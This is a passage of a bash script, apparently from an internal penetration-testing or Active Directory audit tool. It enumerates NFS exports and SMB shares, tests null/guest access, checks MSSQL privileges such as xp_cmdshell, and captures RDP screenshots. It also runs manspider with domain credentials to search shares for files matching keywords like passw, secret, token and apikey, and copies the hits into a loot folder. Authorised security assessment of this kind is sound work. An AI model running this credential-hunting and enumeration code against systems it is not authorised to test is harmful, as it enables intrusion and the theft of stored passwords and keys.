# NFS Share Enumeration
NFS_HOSTS=""
for target in "${SCAN_TARGETS[@]}"; do
  FOUND=$(nmap -Pn -p 2049 --open "$target" -oG - 2>/dev/null | awk '/open/{print $2}')
  [ ! -z "$FOUND" ] && NFS_HOSTS+="$FOUND"$'\n'
done
NFS_HOSTS=$(echo "$NFS_HOSTS" | grep -v "^$")
NFS_COUNT=$(echo "$NFS_HOSTS" | grep -c . 2>/dev/null || echo 0)
if [ "$NFS_COUNT" -gt 0 ]; then
  > "$OUTPUT_DIR/nfs_shares.txt"
  echo "$NFS_HOSTS" | while read -r nfs_ip; do
    mounts=$(showmount -e "$nfs_ip" 2>/dev/null)
    if [ ! -z "$mounts" ]; then
      echo "=== $nfs_ip ===" >> "$OUTPUT_DIR/nfs_shares.txt"
      echo "$mounts" >> "$OUTPUT_DIR/nfs_shares.txt"
    fi
  done
  NFS_WRITTEN=$(wc -l < "$OUTPUT_DIR/nfs_shares.txt" 2>/dev/null || echo 0)
  if [ "$NFS_WRITTEN" -gt 0 ]; then
    echo -e "${RED}[KO] NFS shares found → nfs_shares.txt${NC}"
    grep "===" "$OUTPUT_DIR/nfs_shares.txt" | sed 's/=== //;s/ ===//' | while read -r nfs_ip; do
      if grep -A5 "=== $nfs_ip ===" "$OUTPUT_DIR/nfs_shares.txt" | grep -q '\*'; then
        echo -e "${RED}       └─ $nfs_ip: world-accessible mount${NC}"
      else
        echo -e "${GREY}       └─ $nfs_ip: restricted mounts${NC}"
      fi
    done
  else
    echo -e "${GREEN}[OK] No accessible NFS shares found on ${SUBNET}.0/24${NC}"
    rm -f "$OUTPUT_DIR/nfs_shares.txt"
  fi
else
  echo -e "${GREEN}[OK] No NFS hosts found on ${SUBNET}.0/24${NC}"
fi

# SMB Share Enumeration
> "$OUTPUT_DIR/smb_shares.txt"
for target in "${SCAN_TARGETS[@]}"; do
  nxc smb "$target" -u "$AD_USER" -p "$PASSWORD" --shares 2>/dev/null | grep --text -E "READ|WRITE" >> "$OUTPUT_DIR/smb_shares.txt"
done
READABLE=0
[ -f "$OUTPUT_DIR/smb_shares.txt" ] && READABLE=$(wc -l < "$OUTPUT_DIR/smb_shares.txt" | tr -d ' \n')
if [ "$READABLE" -gt 0 ]; then
  echo -e "${RED}[KO] $READABLE readable/writable share(s) found → smb_shares.txt${NC}"
else
  echo -e "${GREEN}[OK] No readable/writable shares found across all scope targets${NC}"
fi

# SMB Guest Access
GUEST_ACCESS=$(nxc smb $SCAN_TARGETS_STR -u '' -p '' --shares 2>/dev/null | grep -E "READ|WRITE")
GUEST_COUNT=$(echo "$GUEST_ACCESS" | grep -v "^$" | wc -l)
if [ "$GUEST_COUNT" -gt 0 ]; then
  echo -e "${RED}[KO] $GUEST_COUNT share(s) accessible via null/guest session → guest_shares.txt${NC}"
  echo "$GUEST_ACCESS" > "$OUTPUT_DIR/guest_shares.txt"
else
  echo -e "${GREEN}[OK] No shares accessible via null/guest session${NC}"
fi


# Manspider against readable SMB Shares
if [ "$BH_MODE" != "DCOnly" ]; then
  if [ -f "$OUTPUT_DIR/smb_shares.txt" ] && [ "$READABLE" -gt 0 ]; then
    if [ -x "/root/.local/bin/manspider" ]; then
      MANSPIDER_CMD="/root/.local/bin/manspider"
    elif command -v manspider &>/dev/null; then
      MANSPIDER_CMD="manspider"
    else
      MANSPIDER_CMD=""
    fi
    if [ ! -z "$MANSPIDER_CMD" ]; then
      SHARE_HOSTS=$(grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' "$OUTPUT_DIR/smb_shares.txt" | sort -u | head -5)
      mkdir -p "$OUTPUT_DIR/manspider"
      mkdir -p "$OUTPUT_DIR/manspider/loot"
      > "$OUTPUT_DIR/manspider/manspider.txt"
      echo "$SHARE_HOSTS" | while read -r share_host; do
        timeout 60 $MANSPIDER_CMD "$share_host" -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" -c passw passw secret credential token apikey username connectionstring bios pwd passw admin account login logon cred bank ELBA -e txt xml ini config conf csv bat ps1 -s 5M 2>&1 | grep "matched" >> "$OUTPUT_DIR/manspider/manspider.txt"
        cp -r /root/.manspider/loot/. "$OUTPUT_DIR/manspider/loot/" 2>/dev/null
      done
      SPIDER_COUNT=0
      [ -f "$OUTPUT_DIR/manspider/manspider.txt" ] && SPIDER_COUNT=$(grep -c "matched" "$OUTPUT_DIR/manspider/manspider.txt" | tr -d ' \n')
      if [ "$SPIDER_COUNT" -gt 0 ]; then
        echo -e "${RED}[KO] Manspider found $SPIDER_COUNT file(s) with sensitive content → manspider/manspider.txt${NC}"
      else
        echo -e "${GREEN}[OK] Manspider found no sensitive content on readable shares${NC}"
        rm -rf "$OUTPUT_DIR/manspider"
      fi
    else
      echo -e "${GREY}[--] Manspider not found, skipping secret scan${NC}"
      rm -rf "$OUTPUT_DIR/manspider"
    fi
  fi
fi

# MSSQL Discovery
MSSQL_HOSTS=""
for target in "${SCAN_TARGETS[@]}"; do
  FOUND=$(nxc mssql "$target" -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" 2>/dev/null | grep "\[+\]" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | sort -u)
  [ ! -z "$FOUND" ] && MSSQL_HOSTS+="$FOUND"$'\n'
done
MSSQL_HOSTS=$(echo "$MSSQL_HOSTS" | grep -v "^$")
MSSQL_COUNT=$(echo "$MSSQL_HOSTS" | grep -v "^$" | wc -l)
if [ "$MSSQL_COUNT" -gt 0 ]; then
  echo -e "${RED}[KO] $MSSQL_COUNT MSSQL instance(s) found → checking privileges${NC}"
  echo "$MSSQL_HOSTS" | while read -r mssql_host; do
    [ -z "$mssql_host" ] && continue
    echo -e "${GREY}       └─ $mssql_host${NC}"
    nxc mssql $mssql_host -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" -M mssql_priv 2>/dev/null | grep -E "xp_cmdshell|impersonation|linked|db_owner" | while read -r priv; do
      echo -e "${RED}          └─ $priv${NC}"
    done
  done
else
  echo -e "${GREEN}[OK] No accessible MSSQL instances found on ${SUBNET}.0/24${NC}"
fi

# RDP 
echo ""
RDP_OUTPUT=""
for target in "${SCAN_TARGETS[@]}"; do
  RDP_OUTPUT+=$(nxc rdp "$target" -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" 2>/dev/null)$'\n'
done
RDP_ACCESSIBLE=$(echo "$RDP_OUTPUT" | grep "\[+\]" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | sort -u)
RDP_COUNT=$(echo "$RDP_ACCESSIBLE" | grep -v "^$" | wc -l)
if [ "$RDP_COUNT" -gt 0 ]; then
  mkdir -p "$OUTPUT_DIR/rdp"
  for target in "${SCAN_TARGETS[@]}"; do
    nxc rdp "$target" -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" --screenshot --screenshot-dir "$OUTPUT_DIR/rdp/" 2>/dev/null
  done
  SHOT_COUNT=$(ls "$OUTPUT_DIR/rdp/"*.png 2>/dev/null | wc -l)
  echo "$RDP_OUTPUT" | grep "\[+\]" > "$OUTPUT_DIR/accessible-rdp.txt"
  if [ "$SHOT_COUNT" -gt 0 ]; then
    echo -e "${RED}[KO] $RDP_COUNT host(s) with RDP accessible - $SHOT_COUNT screenshot(s) → rdp/${NC}"
  else
    rm -rf "$OUTPUT_DIR/rdp"
    echo -e "${RED}[KO] $RDP_COUNT host(s) with RDP exposed → accessible-rdp.txt${NC}"
  fi
else
  echo -e "${GREEN}[OK] No RDP hosts accessible${NC}"
fi

echo ""
echo -e "${GREEN}[OK] Full report saved → Copy to host: docker cp ${CONTAINER_NAME}:${OUTPUT_DIR} ~/Downloads/${NC}"
echo ""
